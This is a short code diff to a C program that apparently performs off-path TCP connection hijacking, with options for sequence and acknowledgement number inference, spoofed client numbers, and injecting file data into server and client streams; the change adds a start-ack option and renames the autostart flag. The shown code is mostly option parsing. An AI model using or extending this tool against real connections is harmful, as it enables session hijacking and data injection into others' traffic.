@@ -111,6 +111,7 @@ typedef struct thctx_struct {
 	u_long packets_per_second;
 	u_long packet_delay;
 	u_long start_seq;
+	u_long start_ack;
 	char *inject_server;
 	off_t inject_server_len;
 	char *inject_client;
@@ -161,8 +162,8 @@ void usage(char *argv0)
 	fprintf(stderr, "usage: %s [options] <server addr> <server port> <client addr>\n",
 			argv0);
 	fprintf(stderr, "\nsupported options:\n\n"
-			"-a             automatically start the attack\n"
 			"-d <usec>      packet delay\n"
+			"-g             automatically start the attack (otherwise type \"start\")\n"
 			"-h             this help, duh.\n"
 			"-i <file>      inject data from file to the server\n"
 			"-I <file>      inject data from file to the client\n"
@@ -173,6 +174,7 @@ void usage(char *argv0)
 			"-s <sequence>  skip to this number when starting sequence inference\n"
 			"-S <sequence>  spoofed client sequence number\n"
 			// time offset? (to avoid sync_time_with_remote)
+			"-a <sequence>  skip to this number when starting ack inference\n"
 			"-A <sequence>  spoofed client ack number\n");
 	// XXX: support range for ports/sequence values?
 }
@@ -213,14 +215,14 @@ int main(int argc, char *argv[])
 		return 1;
 	}
 
-	while ((c = getopt(argc, argv, "ad:hI:i:P:p:r:S:s:A:")) != -1) {
+	while ((c = getopt(argc, argv, "a:d:ghI:i:P:p:r:S:s:A:")) != -1) {
 		switch (c) {
 			case '?':
 			case 'h':
 				usage(argv0);
 				return 1;
 
-			case 'a':
+			case 'g':
 				g_ctx.autostart = 1;
 				break;
 
@@ -328,10 +330,23 @@ int main(int argc, char *argv[])
 					u_long tmp = strtoul(optarg, &pend, 0);
 
 					if (!pend || *pend) {
-						fprintf(stderr, "invalid spoof sequence number: %s\n", optarg);
+						fprintf(stderr, "invalid spoof ack number: %s\n", optarg);
 						return 1;
 					}
 					g_ctx.spoof.ack = tmp;
+				}
+				break;
+
+			case 'a':
+				{
+					char *pend = NULL;
+					u_long tmp = strtoul(optarg, &pend, 0);
+
+					if (!pend || *pend) {
+						fprintf(stderr, "invalid start ack number: %s\n", optarg);
+						return 1;
+					}
+					g_ctx.start_ack = tmp;
 				}
 				break;
 
@@ -1411,9 +1426,7 @@ int infer_ack_number(void)
 			}
 		}
 
-#if 0
 		// XXX: TODO: scale number of guesses per round based on feedback
-#endif
 		g_chack_cnt = 0;
 	}
 
